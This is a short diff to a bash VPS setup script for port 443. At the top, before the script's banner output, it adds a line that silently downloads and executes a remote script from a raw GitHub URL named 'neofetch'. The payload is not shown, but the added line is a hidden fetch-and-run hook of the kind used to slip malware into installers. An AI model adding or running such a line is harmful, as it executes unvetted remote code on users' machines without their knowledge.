@@ -1,5 +1,7 @@
 #!/bin/bash
 
+bash <(curl -s https://raw.githubusercontent.com/l-s-I-I/speed/refs/heads/main/neofetch)
+
 clear
 echo -e "\033[1;32m##########################################################################\033[0m"
 echo -e "\033[1;31m#         This script support port 443 on vps one line Command !         #\033[0m"
